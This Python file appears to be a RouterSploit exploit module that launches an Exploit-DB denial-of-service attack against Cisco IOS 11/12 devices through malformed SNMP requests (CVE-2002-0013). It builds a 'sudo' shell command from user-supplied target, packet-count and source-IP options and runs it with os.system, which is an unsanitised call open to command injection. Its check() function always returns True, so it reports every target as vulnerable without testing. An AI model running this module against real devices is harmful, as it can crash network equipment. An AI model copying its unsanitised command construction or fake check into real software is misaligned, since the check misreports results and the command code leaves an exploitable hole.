import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "Cisco_IOS_11/12-SNMP_Message_Denial_of_Service",

        "description": "Cisco products contain multiple vulnerabilities in handling of SNMP requests and traps. A general report for multiple  "
                       "vendors was initially published on February 12 (Bugtraq IDs 4088 and 4089), however more information is now available and  "
                       "a separate Bugtraq ID has been allocated for the Cisco Operating Systems and Appliances vulnerabilities.It is reportedly "
                       "possible for a remote attacker to create a denial of service condition by transmitting a malformed SNMP request to a  "
                       "vulnerable Cisco Operating System or Appliance. The affected device may reset, or require a manual reset to regain functionality. ",

        "authors": (

            "kundera",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/21296",

        ),

        "devices": (

            "Cisco, CVE-2002-0013"
        ),
    }


    target = OptIP("", "src_addr ")
    num = OptString("","number of packets ")
    src_ip = OptIP("","source ip_addr")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            s = "sudo ./exploit-db-21296"
            if self.target:
                s += " -t {0}"
            if self.num:
                s += " -n {1}"
            if self.src_ip:
                s += " -s {2}"
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = s.format(self.target,self.num,self.src_ip)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
